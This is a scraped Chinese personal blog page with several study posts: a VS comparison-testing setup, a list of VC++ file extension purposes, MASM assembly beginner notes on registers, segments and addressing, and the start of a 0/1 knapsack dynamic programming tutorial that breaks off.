<p>这是一个叫做“测试”的解决方案 <img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/eg2.png" class> 其中文件“测试.sln”用VS打开即可 其中两个名字分别叫“project1”，“project2”的项目，源文件分别存放在其中 <img src="/2020/12/12/%E5%AF%B9%E6%8B%8D/eg3.png" class> 解决方案中的debug文件夹存放了以命名项目的运行文件</p>
<h2 id="方案">方案</h2>
<p>创建四个项目分别对应，其中“对比”项目设置为主项目 打开解决方案中的“debug文件夹”运行其中的“对比.exe” 系统会自行创建文本 猜想：打开“对比.cpp”运行，该文件原地暂时变成exe文件，并在当前目录搜寻所需，运行结束后回复原状。 如果将对拍所需文件放入“对比”项目文件夹，确实也可以完成对拍，但太麻烦了。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/12/VSC-%E5%90%84%E7%A7%8D%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%9C%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/12/VSC-%E5%90%84%E7%A7%8D%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%9C%E7%94%A8/" class="post-title-link" itemprop="url">VSC++各种文件的作用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-12 15:58:36" itemprop="dateCreated datePublished" datetime="2020-12-12T15:58:36+08:00">2020-12-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-09-08 13:45:16" itemprop="dateModified" datetime="2022-09-08T13:45:16+08:00">2022-09-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="vc各种文件的作用">VC++各种文件的作用</h1>
<p>.APS：存放二进制资源的中间文件，VC把当前资源文件转换成二进制格式，并存放在APS文件中，以加快资源装载速度。资源辅助文件。</p>
<p>.BMP：位图资源文件。</p>
<p>.BSC：浏览信息文件，由浏览信息维护工具（BSCMAKE）从原始浏览信息文件（.SBR）中生成，BSC文件可以用来在源代码编辑窗口中进行快速定位。用于浏览项目信息的，如果用source brower的话就必须有这个文件。可以在project options里去掉Generate Browse Info File，这样可以加快编译进度。</p>
<p>.C：用C语言编写的源代码文件。</p>
<p>.CLW：ClassWizard生成的用来存放类信息的文件。classwizard信息文件，ini文件的格式。</p>
<p>.CNT：用来定义帮助文件中“Contents”的结构。</p>
<p>.CPP或.CXX：用C++语言编写的源代码文件。</p>
<p>.CUR：光标资源文件。</p>
<p>.DEF：模块定义文件，供生成动态链接库时使用。</p>
<p>.DLG：定义对话框资源的独立文件。这种文件对于VC工程来说并非必需，因为VC一般把对话框资源放在.RC资源定义文件中。</p>
<p>.DSP：VC开发环境生成的工程文件，VC4及以前版本使用MAK文件来定义工程。项目文件，文本格式。</p>
<p>.DSW：VC开发环境生成的WorkSpace文件，用来把多个工程组织到一个WorkSpace中。工作区文件，与.dsp差不多。</p>
<p>.EXP：由LIB工具从DEF文件生成的输出文件，其中包含了函数和数据项目的输出信息，LINK工具将使用EXP文件来创建动态链接库。只有在编译DLL时才会生成，记录了DLL文件中的一些信息。</p>
<p>.H、.HPP或.HXX：用C/C++语言编写的头文件，通常用来定义数据类型，声明变量、函数、结构和类。</p>
<p>.HLP：Windows帮助文件。</p>
<p>.HM：在Help工程中，该文件定义了帮助文件与对话框、菜单或其它资源之间ID值的对应关系。</p>
<p>.HPJ：由Help Workshop生成的Help工程文件，用来控制Help文件的生成过程。</p>
<p>.HPG，生成帮助的文件的工程。</p>
<p>.ICO：图标资源文件。</p>
<p>.ILK：连接过程中生成的一种中间文件，只供LINK工具使用。</p>
<p>.INI：配置文件。</p>
<p>.LIB：库文件，LINK工具将使用它来连接各种输入库，以便最终生成EXE文件。</p>
<p>.LIC：用户许可证书文件，使用某些ActiveX控件时需要该文件。</p>
<p>.MAK：即MAKE文件，VC4及以前版本使用的工程文件，用来指定如何建立一个工程，VC6把MAK文件转换成DSP文件来处理。</p>
<p>.MAP：由LINK工具生成的一种文本文件，其中包含有被连接的程序的某些信息，例如程序中的组信息和公共符号信息等。执行文件的映像信息记录文件。</p>
<p>.MDP：旧版本的项目文件，相当于.dsp</p>
<p>.NCB：NCB是“No Compile Browser”的缩写，其中存放了供ClassView、WizardBar和Component Gallery使用的信息，由VC开发环境自动生成。无编译浏览文件。当自动完成功能出问题时可以删除此文件。编译工程后会自动生成。</p>
<p>.OBJ：由编译器或汇编工具生成的目标文件，是模块的二进制中间文件。</p>
<p>.ODL：用对象描述语言编写的源代码文件，VC用它来生成TLB文件。</p>
<p>.OLB：带有类型库资源的一种特殊的动态链接库，也叫对象库文件。</p>
<p>.OPT：VC开发环境自动生成的用来存放WorkSpace中各种选项的文件。工程关于开发环境的参数文件。如工具条位置信息等。</p>
<p>.PBI、.PBO和.PBT：由VC的性能分析工具PROFILE生成并使用的三种文件。</p>
<p>.PCH：预编译头文件，比较大，由编译器在建立工程时自动生成，其中存放有工程中已经编译的部分代码，在以后建立工程时不再重新编译这些代码，以便加快整个编译过程的速度。</p>
<p>.PDB：程序数据库文件，在建立工程时自动生成，其中存放程序的各种信息，用来加快调试过程的速度。记录了程序有关的一些数据和调试信息。</p>
<p>.PLG：编译信息文件，编译时的error和warning信息文件。</p>
<p>.RC：资源定义文件。</p>
<p>.RC2：资源定义文件，供一些特殊情况下使用。</p>
<p>.REG：注册表信息文件。</p>
<p>.RES：二进制资源文件，资源编译器编译资源定义文件后即生成RES文件。</p>
<p>.RTF：Rich Text Format（丰富文本格式）文档，可由Word或写字板来创建，常被用来生成Help文件。</p>
<p>.SBR：VC编译器为每个OBJ文件生成的原始浏览信息文件，浏览信息维护工具（BSCMAKE）将利用SBR文件来生成BSC文件。</p>
<p>.TLB：OLE库文件，其中存放了OLE自动化对象的数据类型、模块和接口定义，自动化服务器通过TLB文件就能了解自动化对象的使用方法。</p>
<p>.WAV：声音资源文件。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB%EF%BC%8C%E5%8F%8AMicrosoft%20MASM%E8%AF%AD%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/12/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB%EF%BC%8C%E5%8F%8AMicrosoft%20MASM%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">汇编语言入门新知识点汇总，及Microsoft MASM语法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-12-03 19:40:10" itemprop="dateCreated datePublished" datetime="2020-12-03T19:40:10+08:00">2020-12-03</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-03-22 00:57:53" itemprop="dateModified" datetime="2022-03-22T00:57:53+08:00">2022-03-22</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="兄弟打字是真滴累">兄弟，打字是真滴累</h1>
<p><strong>位</strong> 自右向左，从0开始顺序编号。左边的位称为最高有效位（Most Significant Bit,，MSB），最右的为最低有效位（LSB，least significant bit）。</p>
<hr>
<p>计算一个十进制（n）转换为二进制后有多少位（b）：b=（log<sub>2</sub> n）的上限;</p>
<hr>
<p>通过检擦十六进制数的最高有效（最高）位，就可以知道该数是整数还是负数。如果最高位大于等于8，该数是负数；如果最高位小于等于7，该数是正数。比如，十六进制数8A20是负数，而7FD9是正数。</p>
<hr>
<p>整数常量后缀声明</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">二进制</th>
<th style="text-align: center;">十进制</th>
<th style="text-align: center;">八进制</th>
<th style="text-align: center;">十六进制</th>
<th style="text-align: center;">编码实数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">b/y</td>
<td style="text-align: center;">d/t</td>
<td style="text-align: center;">q/o</td>
<td style="text-align: center;">h</td>
<td style="text-align: center;">r</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">26			;十进制</span><br><span class="line">26d			;十进制</span><br><span class="line">11010011b	;二进制</span><br><span class="line">42q			;八进制</span><br><span class="line">42o			;八进制</span><br><span class="line">1Ah			;十六进制</span><br><span class="line">0A3h		;十六进制，以字母开头的十六进制数把必须加个0前置0，以防汇编器将其解释为标识符</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="列表文件">列表文件</h1>
<p><strong>符号表</strong> 符号表包含程序中所有的标识符的名称，段和相关信息。 最左边为代码段的地址，这个地址为相对地址，对应可执行指令的起始偏移量。 非可执行指令无偏移量。</p>
<h1 id="语法">语法</h1>
<h2 id="第一个masm程序">第一个masm程序</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.386									伪指令，表示这是一个32位程序，能访问32位寄存器的地址</span><br><span class="line">.modle flat,stdcall	</span><br><span class="line">;选择程序的内存模式为（flat），并确定了子程序的调用规范（stdcall）（32位windows服务要求使用stdcall规范）</span><br><span class="line">.stack 4096								;STACK伪指令标识的程序区段定义了运行时堆栈，并设置了其大小，4096字节</span><br><span class="line">ExitProcess proto, dwexitcode:dword</span><br><span class="line">;这是一个函数原型的声明，声明ExitProcess函数（一个标准的windows服务）</span><br><span class="line">;原型包括：函数名、PROTO关键字、一个逗号、以及一个输入参数列表</span><br><span class="line">;ExitProcess的输入参数为dwexitcode</span><br><span class="line"></span><br><span class="line">.data					;此为数据区</span><br><span class="line">sum dword 999			;定义名为sum的变量,大小为32位，使用了关键字DWORD</span><br><span class="line"></span><br><span class="line">.code					;此为代码区</span><br><span class="line">main proc				;声明，标记了程序开始执行的地址</span><br><span class="line">	mov eax,8</span><br><span class="line">	mov ebx,8</span><br><span class="line">	add eax,ebx</span><br><span class="line">	inc eax</span><br><span class="line">	imul eax,sum,8				;X86指令集不允许将变量直接与变量相加，但允许变量与寄存器相加</span><br><span class="line">comment !be太苣了!</span><br><span class="line">	invoke ExitProcess,0		</span><br><span class="line">	;调用Windows服务（也被成为函数）ExitProcess停止程序，并将控制权交还给操作系统。还有invoke也是伪指令</span><br><span class="line">main endp						;是主程序结束的标记</span><br><span class="line">end main						;end伪指令，标记汇编的最后一行，标识程序入口main</span><br></pre></td></tr></table></figure>
<p><strong>保留字</strong>由计算机保留，<strong>标识符</strong>由程序员定义</p>
<p><strong>伪指令</strong> 伪指令是嵌入源代码中的命令，有汇编器识别和执行。伪指令不在运行时执行，但是可以定义变量、宏和子程序，为内存段分配名称等等。</p>
<p><strong>指令</strong> 一条指令有四个组成部分： 标号（可选） 指令助记符 操作数 注释（可选）</p>
<p><strong>标号</strong> <img src="/2020/12/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB%EF%BC%8C%E5%8F%8AMicrosoft%20MASM%E8%AF%AD%E6%B3%95/1.jpg" class></p>
<p><strong>指令助记符</strong> 如：MOV, ADD, SUB, MUL, JMP, CALL</p>
<p><strong>操作数</strong> 可以为：整数常量，整数表达式，寄存器，内存 注：有一些些指令可以无操作数</p>
<p><strong>NOP（空操作）指令</strong> 安全无用，占用一个字节，被用于将代码对齐到有效的地址边界</p>
<p><strong>回顾一些重要伪指令</strong></p>
<p>.model 它告诉汇编程序用的是哪一种存储模式</p>
<p>.code 标记一个程序代码区的起点</p>
<p>endp标记一个过程的结束，在此处为对应main的过程。 main PROC············main ENDP</p>
<p>end标记一个程序的结束，并要引用入口</p>
<p><strong>汇编器生成包含机器语言的文件（目标文件object file），传递给链接器（linker）程序，从而生成可执行文件（exe）——在操作系统命令提示符下执行。</strong></p>
<h2 id="位模板">32位模板</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">.stack 4096</span><br><span class="line">ExitProcess PROTO, dwExitCode:DWORD</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">	;在这里声明变量</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">	;在这里编写自己的代码</span><br><span class="line">	INVOKE ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>
<h2 id="段">段</h2>
<p>bss段： 　　bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。 　　bss是英文Block Started by Symbol的简称。 　　bss段属于静态内存分配。</p>
<p>data段： 　　数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。 　　数据段属于静态内存分配。 　　 text段/code段： 　　代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。 　　这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。 　　在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<p>堆（heap）： 　　堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。 　　当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）； 　　当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
<p>栈(stack)： 　　 栈又称堆栈，是用户存放程序临时创建的局部变量， 　　也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。 　　除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。 　　由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。 　　从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
<p>​ 一个程序本质上都是由 bss段、data段、code段三个组成的。 　　这样的概念，不知道最初来源于哪里的规定，但在当前的计算机程序设计中是很重要的一个基本概念。 　　而且在嵌入式系统的设计中也非常重要，牵涉到嵌入式系统运行时的内存大小分配，存储单元占用空间大小的问题。 在采用段式内存管理的架构中（比如intel的80x86系统），bss段通常是指用来存放程序中未初始化的全局变量的一块内存区域， 　　一般在初始化时bss 段部分将会清零。bss段属于静态内存分配，即程序一开始就将其清零了。 比如，在C语言之类的程序编译完成之后，已初始化的全局变量保存在.data 段中，未初始化的全局变量保存在.bss 段中。 　　code和data段都在可执行文件中（在嵌入式系统里一般是固化在镜像文件中），由系统从可执行文件中加载； 　　而bss段不在可执行文件中，由系统初始化。</p>
<h2 id="数据定义伪指令">数据定义伪指令</h2>
<table>
<thead>
<tr class="header">
<th>伪指令</th>
<th>用法</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>BYTE</td>
<td>8位无符号整数，B代表字节</td>
</tr>
<tr class="even">
<td>WORD</td>
<td>16位无符号整数</td>
</tr>
<tr class="odd">
<td>REAL4</td>
<td>32位（4字节）IEEE短实数</td>
</tr>
<tr class="even">
<td>QWORD</td>
<td>64位整数，Q代表四（字）</td>
</tr>
<tr class="odd">
<td>DWORD</td>
<td>32位整数，D代表双（字）</td>
</tr>
<tr class="even">
<td>DB/SBYTE</td>
<td>8位整数</td>
</tr>
<tr class="odd">
<td>DW/SWORD</td>
<td>16位整数</td>
</tr>
<tr class="even">
<td>DD</td>
<td>32位整数或实数</td>
</tr>
<tr class="odd">
<td>DQ</td>
<td>64位整数或实数</td>
</tr>
<tr class="even">
<td>DT/TBYTE</td>
<td>定义80位（10字节）整数</td>
</tr>
<tr class="odd">
<td>剩余遇到后补充</td>
<td></td>
</tr>
</tbody>
</table>
<p><strong>定义</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">greeting1 \</span><br><span class="line">BYTE &quot;welcome,&quot;,0dh,0da</span><br><span class="line">BYTE &quot;Allow me.&quot;,0</span><br><span class="line">;可分行；“\”把两源代码行连接成一条语句；“0dh”“0da”换行（将光标移动到下一行）；“0”空字节作为结束标记</span><br><span class="line">a DWORD 20 DUP(0)	;分配空间20字节，初始值为0</span><br></pre></td></tr></table></figure>
<p><strong>将实数编码压缩为BCD编码</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">a REAL8 1.5</span><br><span class="line">b TBYTE ?	;未初始化时减小编译程序大小</span><br><span class="line">.code</span><br><span class="line">fld a		;加载到浮点堆栈</span><br><span class="line">fbstp b		;向上舍入到2，压缩BCD码值</span><br></pre></td></tr></table></figure>
<h2 id="一些符号">一些符号</h2>
<p><strong>键盘定义</strong> 键盘有对应的ASCII码，如Esc键的ASCII码为27</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov a,Esc_key </span><br></pre></td></tr></table></figure>
<p><strong>计算数组和字符串大小</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a BYTE 10,20,30,404</span><br><span class="line">l = ($ - a)</span><br><span class="line"></span><br><span class="line">name BYTE &quot;123&quot;,0</span><br><span class="line">name_len = ($ - name)-1	;0也占一个字符</span><br></pre></td></tr></table></figure>
<p>显示声明数组的大小会导致编程错误，尤其是如果后续还会插入或删除数组元素。 声明数组大小更好的方法是，让汇编器来计算这个值。 从当前地址计数器（$）中减去name的偏移量 name_len紧跟着name 当计算元素数量的数组中包含的不是字节时，应用数组总字节数除以单个元素大小，一般来说单个元素为1字节，所以没有这步</p>
<p><strong>等号、EQU、TEXTQU伪指令</strong></p>
<table>
<thead>
<tr class="header">
<th>伪指令</th>
<th>跟着的</th>
<th>注意</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>EQU</td>
<td>整数表达式，符号，<文本></文本></td>
<td>不能重新定义</td>
</tr>
<tr class="even">
<td>TEXTEQU</td>
<td><文本>，%整数表达式，TEXTEQU</文本></td>
<td>可以套娃</td>
</tr>
<tr class="odd">
<td>=</td>
<td>整数表达式，</td>
<td>可重新定义</td>
</tr>
</tbody>
</table>
<h2 id="位模板-1">64位模板</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">;省略了一堆东西</span><br><span class="line">ExitProcess PROTO		;PROTO不带参数</span><br><span class="line">.data</span><br><span class="line">	;定义变量</span><br><span class="line">.code</span><br><span class="line">main PROC</span><br><span class="line">	;代码</span><br><span class="line">	mov ecx,0			;64位不带INVOKE，用mov，call结束程序</span><br><span class="line">	call ExitProcess</span><br><span class="line">main endp</span><br><span class="line">END						;未指定程序入口点</span><br></pre></td></tr></table></figure>
<h2 id="通用寄存器">通用寄存器</h2>
<p>32位的一些通用寄存器</p>
<table>
<thead>
<tr class="header">
<th>32位</th>
<th>16位</th>
<th>8位（高）</th>
<th>8位（低）</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>EAX</td>
<td>AX</td>
<td>AH</td>
<td>AL</td>
</tr>
<tr class="even">
<td>EBX</td>
<td>BX</td>
<td>BH</td>
<td>BL</td>
</tr>
<tr class="odd">
<td>ECX</td>
<td>CX</td>
<td>CH</td>
<td>CL</td>
</tr>
<tr class="even">
<td>EDX</td>
<td>DX</td>
<td>DH</td>
<td>DL</td>
</tr>
<tr class="odd">
<td>ESI</td>
<td>SI</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>EDI</td>
<td>DI</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>EBP</td>
<td>BI</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>ESP</td>
<td>SP</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>注： 乘除指令默认使用EAX CPU默认使用ECX为循环计数器 ESP用于寻址堆栈数据。 ESI和EDI用于高速储存器传输指令 <img src="/2020/12/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB%EF%BC%8C%E5%8F%8AMicrosoft%20MASM%E8%AF%AD%E6%B3%95/2.jpg" class> <img src="/2020/12/03/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%85%A5%E9%97%A8%E6%96%B0%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB%EF%BC%8C%E5%8F%8AMicrosoft%20MASM%E8%AF%AD%E6%B3%95/3.jpg" class></p>
<h2 id="movzxmovsx指令">MOVZX/MOVSX指令</h2>
<p>movzx(进行全零扩展并传送) movsx(进行符号扩展并传送)</p>
<h2 id="offset-运算符">offset 运算符</h2>
<p>offset运算符返回数据标号的偏移量。这个偏移量按字节计算，表示的是该数据标号距离数据段起始地址的距离。</p>
<h2 id="间接寻址数组">间接寻址（数组）</h2>
<p><strong>间接操作数</strong> 任何一个32位通用寄存器（eax，ebx等）加上中括号就能构成一个间接操作数。寄存器中存放的是数据的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">a BYTE 10h</span><br><span class="line">b BYTE 20h</span><br><span class="line">.code</span><br><span class="line">mov esi,offset a</span><br><span class="line">mov al,[esi]		;al是通用寄存器, al=10h;</span><br><span class="line">mov [esi],b			;a=b=20h</span><br></pre></td></tr></table></figure>
<p>在该示例中，esi存放的是a的偏移量，mov指令使用间接操作数作为源操作数，<strong>解析</strong>esi中的偏移量，并将一个字节送入al。再解析esi中的偏移量，将一个字节送入a。</p>
<p><strong>变址操作数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">a BYTE 10h,20h,30h,40h</span><br><span class="line">.code</span><br><span class="line">mov esi,0</span><br><span class="line">mov al,[a+esi] ;也可以写成mov al,a[esi]</span><br></pre></td></tr></table></figure>
<p>在中括号内用变量名加上寄存器。变量名会由汇编器转化为常数，代表的是该变量的偏移量。</p>
<h2 id="第五章-过程">第五章-过程</h2>
<p><strong>栈堆相关寄存器</strong> 运行时堆栈是内存数组，CPU用ESP寄存器（堆栈指针寄存器），对其进行管理。 ESP存放的是堆栈中某个位置的32位偏移量，每个堆栈位置都是32位长。 对应64位下的rsp（低位为esp）</p>
<p>几个常用的寄存器 sp/esp/rsp（16bit/32bit/64bit）栈寄存器---指向栈顶 bp/ebp/rbp 栈基址寄存器---指向栈底 ip/eip/rip 程序指令寄存器---指向下一条待执行指令</p>
<p>运行时堆栈在内存中是向下生长的，即从高地址向低地址扩展，故栈顶指针指向低地址。</p>
<p><strong>CALL和RET指令</strong> call指令调用一个过程，指挥处理器从新的内存地址开始执行。过程使用ret（从过程返回）指令将处理器转回到该过程被调用的程序点上。 从物理上来说， call指令将其返回的地址压入堆栈， 再把被调用过程的地址复制到指令指针寄存器。 当过程准备返回时，它的ret指令从堆栈把返回地址弹回到指令指针寄存器。 32位模式下，cpu执行的指令由EIP（指令指针寄存器）在内存中指出。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/25/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94%E4%BB%8E%E8%83%8C%E5%8C%85%E5%88%B0%E8%A2%AB%E6%9A%B4%E6%89%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="冲击波">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="你们这样对得起孤胆英雄飞天狙吗">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/11/25/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E2%80%94%E2%80%94%E4%BB%8E%E8%83%8C%E5%8C%85%E5%88%B0%E8%A2%AB%E6%9A%B4%E6%89%93/" class="post-title-link" itemprop="url">动态规划——从背包到被暴打</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2020-11-25 21:47:11" itemprop="dateCreated datePublished" datetime="2020-11-25T21:47:11+08:00">2020-11-25</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2022-02-24 13:45:04" itemprop="dateModified" datetime="2022-02-24T13:45:04+08:00">2022-02-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="动态规划引入">动态规划引入</h1>
<p>题型：给定背包总空间、各物品占用及其对应价值，再给出其他条件，求背包所能获得的最大价值</p>
<h2 id="背包">01背包</h2>
<p>输入 第一行有2个整数T和M，T代表背包总空间，M代表不同物品的个数（每种物品只有一个）。 接下来的M行每行包括两个整数，分别表示这个物品的占用空间和对应价值 输出 背包能装下物品的价值之和的最大值</p>
<p>解： 1.先用t[i]和v[i]分别存储第i个物品的占用和价值 2.思考：动态规划的关键在于状态的转移，由最小背包的最优决策慢慢转移至所求背包的最优决策 3.设置dp[T]。dp[k]储存当背包空间大小为k时，在当前情况下能得到的最大价值 4.思考：对于每一个物品，只需考虑要与不要，判断要和不要哪个价值大 5.写出状态转移方程：dp[j]=max( dp[j],dp[j-t[i]]+v[i] ) //i: 1 to M; j: T to t[i];</p>
<p>部分代码</p>
